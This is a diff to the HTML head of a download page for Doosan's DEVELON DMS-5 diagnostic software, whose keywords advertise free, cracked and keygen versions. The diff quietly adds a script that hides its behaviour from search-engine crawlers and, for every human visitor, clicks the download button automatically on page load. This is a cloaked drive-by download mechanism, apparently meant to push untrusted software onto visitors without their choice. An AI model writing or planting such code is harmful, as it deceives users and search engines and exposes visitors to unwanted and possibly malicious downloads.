@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DEVELON DMS-5 3.1.9 (for Doosan)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download DEVELON DMS-5 3.1.9 for Doosan diagnostic software. Supports excavators and wheel loaders with comprehensive updates.">
     <meta name="keywords" content="DEVELON DMS-5, DEVELON DMS-5 3.1.9, Doosan diagnostic software, Doosan diagnostic sofware download, Doosan diagnostic sofware download free, Doosan diagnostic sofware crack, Doosan diagnostic sofware keygen, diagnostic management system Doosan, Doosan excavators software, Doosan wheel loaders software, 2023 Develon DMS-5, Doosan Monitoring Program, e-EPOS controller, VCU controller, engine controller software, Doosan ECU communication, Doosan IBM interface, DMS-5 software, Doosan repair tools, excavator diagnostic tools, wheel loader diagnostics, DEVELON DMS-5 free download, DEVELON DMS-5 3.1.9 download, DEVELON DMS-5 3.1.9 free, Девелон DMS-5, Девелон DMS-5 3.1.9, Диагностическое программное обеспечение Doosan, Doosan диагностическое программное обеспечение скачать, Диагностическая система управления Doosan, Программа мониторинга Doosan, Контроллер e-EPOS, Контроллер VCU, Программное обеспечение для контроллера двигателя, общение ECU Doosan, интерфейс Doosan IBM, Программное обеспечение DMS-5, Инструменты для ремонта Doosan, Инструменты для диагностики экскаваторов, Диагностика колесных погрузчиков, DEVELON DMS-5 бесплатная загрузка, DEVELON DMS-5 3.1.9 скачать, DEVELON DMS-5 3.1.9 бесплатно, Девелон DMS-5 скачать бесплатно">
     <style>
